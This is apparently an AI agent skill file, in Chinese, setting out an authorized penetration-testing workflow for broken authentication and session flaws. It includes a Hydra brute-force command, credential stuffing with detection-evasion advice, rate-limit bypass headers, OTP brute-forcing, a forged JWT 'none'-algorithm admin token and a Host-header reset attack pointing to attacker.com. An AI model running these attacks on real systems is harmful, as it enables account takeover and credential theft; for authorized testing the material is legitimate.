---
name: broken-authentication
description: "识别和利用 Web 应用中的身份认证与会话管理漏洞。身份认证失效常年位列 OWASP Top 10，可导致账户接管、身份盗用和未授权访问敏感系统。当用户要求'测试身份认证漏洞'、'检测认证绕过'、'会话管理测试'、'暴力破解测试'、'MFA绕过'、'broken authentication'时使用。"
risk: unknown
source: community
author: zebbern
date_added: "2026-02-27"
---

# 身份认证失效测试

## 目的

识别和利用 Web 应用中的身份认证与会话管理漏洞。身份认证失效常年位列 OWASP Top 10，可导致账户接管、身份盗用和未授权访问敏感系统。本技能涵盖密码策略、会话处理、多因素认证和凭据管理的测试方法。

## 前置条件

### 必备知识
- HTTP 协议与会话机制
- 认证类型（SFA、2FA、MFA）
- Cookie 和 token 处理
- 常见认证框架

### 必备工具
- Burp Suite Professional 或 Community 版
- Hydra 或类似暴力破解工具
- 用于凭据测试的自定义字典
- 浏览器开发者工具

### 必备权限
- 目标应用 URL
- 测试账户凭据
- 书面授权许可

## 输出与交付物

1. **认证评估报告** - 记录所有已识别的漏洞
2. **凭据测试结果** - 暴力破解和字典攻击结果
3. **会话安全分析** - token 随机性与超时评估
4. **修复建议** - 安全加固指导

## 核心工作流

### 阶段 1：认证机制分析

理解应用的认证架构：

```
# Identify authentication type
- Password-based (forms, basic auth, digest)
- Token-based (JWT, OAuth, API keys)
- Certificate-based (mutual TLS)
- Multi-factor (SMS, TOTP, hardware tokens)

# Map authentication endpoints
/login, /signin, /authenticate
/register, /signup
/forgot-password, /reset-password
/logout, /signout
/api/auth/*, /oauth/*
```

捕获并分析认证请求：

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test123
```

### 阶段 2：密码策略测试

评估密码要求和执行情况：

```bash
# Test minimum length (a, ab, abcdefgh)
# Test complexity (password, password1, Password1!)
# Test common weak passwords (123456, password, qwerty, admin)
# Test username as password (admin/admin, test/test)
```

记录策略缺陷：最小长度 <8、无复杂度要求、允许常见密码、允许用户名作为密码。

### 阶段 3：凭据枚举

测试用户名枚举漏洞：

```bash
# Compare responses for valid vs invalid usernames
# Invalid: "Invalid username" vs Valid: "Invalid password"
# Check timing differences, response codes, registration messages
```

# Password reset
"Email sent if account exists" (secure)
"No account with that email" (leaks info)

# API responses
{"error": "user_not_found"}
{"error": "invalid_password"}
```

### 阶段 4：暴力破解测试

测试账户锁定和速率限制：

```bash
# Using Hydra for form-based auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Using Burp Intruder
1. Capture login request
2. Send to Intruder
3. Set payload positions on password field
4. Load wordlist
5. Start attack
6. Analyze response lengths/codes
```

检查防护措施：

```bash
# Account lockout
- After how many attempts?
- Duration of lockout?
- Lockout notification?

# Rate limiting
- Requests per minute limit?
- IP-based or account-based?
- Bypass via headers (X-Forwarded-For)?

# CAPTCHA
- After failed attempts?
- Easily bypassable?
```

### 阶段 5：凭据填充

使用已知泄露凭据进行测试：

```bash
# Credential stuffing differs from brute force
# Uses known email:password pairs from breaches

# Using Burp Intruder with Pitchfork attack
1. Set username and password as positions
2. Load email list as payload 1
3. Load password list as payload 2 (matched pairs)
4. Analyze for successful logins

# Detection evasion
- Slow request rate
- Rotate source IPs
- Randomize user agents
- Add delays between attempts
```

### 阶段 6：会话管理测试

分析会话 token 安全性：

```bash
# Capture session cookie
Cookie: SESSIONID=abc123def456

# Test token characteristics
1. Entropy - Is it random enough?
2. Length - Sufficient length (128+ bits)?
3. Predictability - Sequential patterns?
4. Secure flags - HttpOnly, Secure, SameSite?
```

会话 token 分析：

```python
#!/usr/bin/env python3
import requests
import hashlib

# Collect multiple session tokens
tokens = []
for i in range(100):
    response = requests.get("https://target.com/login")
    token = response.cookies.get("SESSIONID")
    tokens.append(token)

# Analyze for patterns
# Check for sequential increments
# Calculate entropy
# Look for timestamp components
```

### 阶段 7：会话固定测试

测试认证后是否会重新生成会话：

```bash
# Step 1: Get session before login
GET /login HTTP/1.1
Response: Set-Cookie: SESSIONID=abc123

# Step 2: Login with same session
POST /login HTTP/1.1
Cookie: SESSIONID=abc123
username=valid&password=valid

# Step 3: Check if session changed
# VULNERABLE if SESSIONID remains abc123
# SECURE if new session assigned after login
```

攻击场景：

```bash
# Attacker workflow:
1. Attacker visits site, gets session: SESSIONID=attacker_session
2. Attacker sends link to victim with fixed session:
   https://target.com/login?SESSIONID=attacker_session
3. Victim logs in with attacker's session
4. Attacker now has authenticated session
```

### 阶段 8：会话超时测试

验证会话过期策略：

```bash
# Test idle timeout
1. Login and note session cookie
2. Wait without activity (15, 30, 60 minutes)
3. Attempt to use session
4. Check if session is still valid

# Test absolute timeout
1. Login and continuously use session
2. Check if forced logout after set period (8 hours, 24 hours)

# Test logout functionality
1. Login and note session
2. Click logout
3. Attempt to reuse old session cookie
4. Session should be invalidated server-side
```

### 阶段 9：多因素认证测试

评估 MFA 实现的安全性：

```bash
# OTP brute force
- 4-digit OTP = 10,000 combinations
- 6-digit OTP = 1,000,000 combinations
- Test rate limiting on OTP endpoint

# OTP bypass techniques
- Skip MFA step by direct URL access
- Modify response to indicate MFA passed
- Null/empty OTP submission
- Previous valid OTP reuse

# API Version Downgrade Attack (crAPI example)
# If /api/v3/check-otp has rate limiting, try older versions:
POST /api/v2/check-otp
{"otp": "1234"}
# Older API versions may lack security controls

# Using Burp for OTP testing
1. Capture OTP verification request
2. Send to Intruder
3. Set OTP field as payload position
4. Use numbers payload (0000-9999)
5. Check for successful bypass
```

测试 MFA 注册：

```bash
# Forced enrollment
- Can MFA be skipped during setup?
- Can backup codes be accessed without verification?

# Recovery process
- Can MFA be disabled via email alone?
- Social engineering potential?
```

### 阶段 10：密码重置测试

分析密码重置安全性：

```bash
# Token security
1. Request password reset
2. Capture reset link
3. Analyze token:
   - Length and randomness
   - Expiration time
   - Single-use enforcement
   - Account binding

# Token manipulation
https://target.com/reset?token=abc123&user=victim
# Try changing user parameter while using valid token

# Host header injection
POST /forgot-password HTTP/1.1
Host: attacker.com
email=victim@email.com
# Reset email may contain attacker's domain
```

## 快速参考

### 常见漏洞类型

| 漏洞 | 风险 | 测试方法 |
|------|------|----------|
| 弱密码 | 高 | 策略测试、字典攻击 |
| 无锁定机制 | 高 | 暴力破解测试 |
| 用户名枚举 | 中 | 差异响应分析 |
| 会话固定 | 高 | 登录前后会话对比 |
| 弱会话 token | 高 | 熵值分析 |
| 无会话超时 | 中 | 长时会话测试 |
| 不安全的密码重置 | 高 | token 分析、流程绕过 |
| MFA 绕过 | 严重 | 直接访问、响应篡改 |

### 凭据测试载荷

```bash
# Default credentials
admin:admin
admin:password
admin:123456
root:root
test:test
user:user

# Common passwords
123456
password
12345678
qwerty
abc123
password1
admin123

# Breached credential databases
- Have I Been Pwned dataset
- SecLists passwords
- Custom targeted lists
```

### 会话 Cookie 标志

| 标志 | 用途 | 缺失时的风险 |
|------|------|-------------|
| HttpOnly | 阻止 JS 访问 | XSS 可窃取会话 |
| Secure | 仅 HTTPS 传输 | 通过 HTTP 明文发送 |
| SameSite | CSRF 防护 | 允许跨站请求 |
| Path | URL 作用域 | 暴露范围更广 |
| Domain | 域名作用域 | 子域名可访问 |
| Expires | 生命周期 | 会话持久存在 |

### 速率限制绕过请求头

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

## 约束与限制

### 法律要求
- 仅在获得明确书面授权后测试
- 避免使用真实泄露凭据进行测试
- 不得访问真实用户账户
- 记录所有测试活动

### 技术限制
- CAPTCHA 可能阻止自动化测试
- 速率限制影响暴力破解时间
- MFA 显著增加攻击难度
- 部分漏洞需要受害者交互

### 范围考量
- 测试账户行为可能与生产环境不同
- 部分功能在测试环境中可能被禁用
- 第三方认证可能超出测试范围
- 生产环境测试需格外谨慎

## 示例

### 示例 1：账户锁定绕过

**场景：** 测试账户锁定是否可被绕过

```bash
# Step 1: Identify lockout threshold
# Try 5 wrong passwords for admin account
# Result: "Account locked for 30 minutes"

# Step 2: Test bypass via IP rotation
# Use X-Forwarded-For header
POST /login HTTP/1.1
X-Forwarded-For: 192.168.1.1
username=admin&password=attempt1

# Increment IP for each attempt
X-Forwarded-For: 192.168.1.2
# Continue until successful or confirmed blocked

# Step 3: Test bypass via case manipulation
username=Admin (vs admin)
username=ADMIN
# Some systems treat these as different accounts
```

### 示例 2：JWT token 攻击

**场景：** 利用弱 JWT 实现

```bash
# Step 1: Capture JWT token
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature

# Step 2: Decode and analyze
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"user":"test","role":"user"}

# Step 3: Try "none" algorithm attack
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

# Step 4: Submit modified token
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### 示例 3：密码重置 token 利用

**场景：** 测试密码重置功能

```bash
# Step 1: Request reset for test account
POST /forgot-password
email=test@example.com

# Step 2: Capture reset link
https://target.com/reset?token=a1b2c3d4e5f6

# Step 3: Test token properties
# Reuse: Try using same token twice
# Expiration: Wait 24+ hours and retry
# Modification: Change characters in token

# Step 4: Test for user parameter manipulation
https://target.com/reset?token=a1b2c3d4e5f6&email=admin@example.com
# Check if admin's password can be reset with test user's token
```

## 故障排除

| 问题 | 解决方案 |
|------|----------|
| 暴力破解过慢 | 确定速率限制范围；IP 轮换；增加延迟；使用精准字典 |
| 会话分析无结论 | 收集 1000+ token；使用统计工具；检查时间戳；跨账户对比 |
| MFA 无法绕过 | 记录为安全；测试备份/恢复机制；检查 MFA 疲劳攻击；验证注册流程 |
| 账户锁定阻碍测试 | 申请多个测试账户；先测试锁定阈值；降低请求频率 |

## 何时使用
本技能适用于执行概述中描述的工作流或操作。
